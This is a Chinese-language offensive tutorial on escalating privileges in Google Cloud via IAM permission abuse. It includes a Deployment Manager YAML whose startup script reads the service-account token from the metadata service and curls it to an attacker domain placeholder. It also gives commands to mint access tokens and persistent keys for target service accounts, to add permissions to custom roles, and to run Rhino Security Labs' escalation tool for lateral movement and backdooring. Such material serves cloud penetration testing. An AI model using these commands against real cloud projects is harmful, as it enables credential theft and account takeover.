  #### IAM 权限
	绝大多数权限提升技术都是围绕成员的角色和权限进行的。 请记住，GCP 权限用于决定成员有权访问哪些资源
	● https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
	● https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/
  ##### Deploymentmanager.deployments.create
	此权限允许您将资源部署为“cloudservices.gserviceaccount.com”，默认情况下具有编辑者角色。 攻击者可以滥用此权限来创建计算实例，添加启动脚本以通过元数据服务收集服务帐户访问令牌，最后将其发送回攻击者。
	第一步是创建用于设置计算引擎实例的 YAML 文件。
	请注意，启动脚本向元数据服务发出 curl 请求，然后它获取响应并将其发送到攻击者的计算机。 这个配置文件可以在下面找到，
	只需将 <ATTACKER-DOMAIN-HERE> 行替换为您的域或 ip：
	resources:
	- name: vm-created-by-deployment-manager
	  type: compute.v1.instance
	  properties:
	    zone: us-central1-a
	    machineType: zones/us-central1-a/machineTypes/n1-standard-1
	    disks:
	       deviceName: boot
	    type: PERSISTENT
	    boot: true
	    autoDelete: true
	    initializeParams:
	        sourceImage: projects/debian-cloud/global/images/family/debian-9
	    networkInterfaces:
	    - network: global/networks/default
	      accessConfigs:
	        - name: External NAT
	        type: ONE_TO_ONE_NAT
	    metadata:
	      items:
	      - key: startup-script
	        value: |
	            #!/bin/bash
	            apt-get update
	            apt-get install -y curl 
	            curl http://<ATTACKER-DOMAIN-HERE>/gce_token -d $(curl
	            http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token)
	    serviceAccounts:
	    - email: default
	      scopes:
	        - https://www.googleapis.com/auth/cloud-platform
	接下来，您需要使用部署管理器命令创建计算引擎
	如下所示：
	gcloud deployment-manager deployments create <DEPLOYMENT-NAME> --config <CONFIG-FILE-NAME>.yaml
	计算引擎启动后，您应该会收到带有新创建的访问令牌的回调
  ##### iam.roles.update
	角色只是权限的集合。 iam.roles.update 权限允许您向自定义角色添加其他权限。 如果您将自定义角色应用于您的帐户，您可以向该角色添加额外的权限，以便您升级您的权限，如下所示：
	> gcloud iam roles update <ROLE-NAME> --project PROJECT-ID>--permissions=<PERMISSION-1,PERISSION-2>
  ##### iam.serviceAccounts.getAccessToken
	在 gcloud 中，访问令牌充当帐户的临时凭证。 获得对另一个用户的访问令牌的访问权限允许攻击者以受害者身份向 gcloud 进行身份验证。 不幸的是，我找不到 gcloud cli 命令来执行此操作，但我们可以使用
	谷歌API如下图：
	>  curl -X POST -H "Authorization: Bearer "$(gcloud auth print-access-token) -H "Content-Type: application/json; charset=utf-8" -d "{ 'scope': [ 'https://www.googleapis.com/auth/iam','https://www.googleapis.com/auth/cloud-platform' ] }" https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<TARGET-SERVICE-ACCOUNT>:generateAccessToken
  ##### iam.serviceAccountKeys.create
	iam.serviceAccounts.getAccessToken 允许您创建临时凭证，但此权限允许您创建附加到服务帐户的永久密钥。 然后可以使用这些密钥登录 gcloud
	> gcloud iam service-accounts keys create OUTPUT-FILE --iam-account=IAM_ACCOUNT
  ##### iam.serviceAccounts.actAs
	此权限允许您使用另一个服务帐户创建资源。例如，如果您想创建一个计算实例并将另一个服务帐户附加到该 VM，您将需要此权限以及创建 VM 的权限。
	在以下需要此权限才能工作的小节中可以找到更多示例。
	Cloudfunctions.functions.create
	此方法需要设置以下权限：
	● iam.serviceAccounts.actAs
	● Cloudfunctions.functions.create
	● Cloudfunctions.functions.sourceCodeSet
	● Cloudfunctions.functions.create
	在这里，我们正在创建一个云函数作为另一个服务帐户，当调用该服务帐户时，它将获取服务帐户访问令牌并将其发送到攻击者的机器。
	● 创建云功能
	● 附加服务帐号到云功能
	● 调用云功能
	    ○ 使用元数据服务获取访问令牌
	● 向攻击者发送凭据
  #### GCP IAM 权限提升工具
	Rhino Security Labs 还创建了一个工具，可用于搜索和利用这些错误配置：
	● https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
	要使用此工具，您必须拥有有效的访问令牌和项目 ID。可以通过多种方式检索访问令牌和项目 ID，但最流行的方式之一是通过 SSRF。
	首先运行 enumerate_member_permissions.py 脚本
	> python3 enumerate_member_permissions.py --project xxxxx
	请注意，如果您没有正确的权限，该命令将失败并且您将无法检查权限升级，但是您可以使用蛮力方法，手动尝试所有的利用，直到一个有效。
	如果您确实拥有正确的权限，该命令将运行并将所有内容保存到一个文件夹中。 下一步是运行“python3 check_for_privesc.py”命令。 鉴于当前的 IAM 政策，这将检查您可以危害其他账户的所有可能方式
	根据结果，您将能够破坏多个帐户。 要实际运行漏洞利用，您需要移动到漏洞利用文件夹。 然后你只需选择你的漏洞利用，用你的详细信息编辑 python 文件，然后运行脚本。
	为其他帐户创建服务帐户密钥，如果成功，这将允许您以该服务帐户身份登录，这对于横向移动非常有用
	在文件iam.serviceAccountKeys.create.py中我们需要输入项目 id 和我们的目标服务帐户。 之后，运行脚本，它会询问您的访问令牌，脚本完成后，它将创建并输出目标服务帐户密钥
	接下来，您必须对“privateKeyData”进行 base64 解码，它应该为您提供一个 json blob。 此 json blob 是您的凭据。 获得凭据后，您可以使用 gcloud 通过以下命令以该用户身份登录。
	> gcloud auth activate-service-account --key-file=test_cred.json
	如果用户拥有比我们更高的权限，那么我们只需执行权限升级，如果他们没有，那么我们可以使用它进行横向移动。 此外，我们还可以使用相同的技术对用户进行后门。
	查看“check_for_privesc.py”脚本的输出即可了解您可以做什么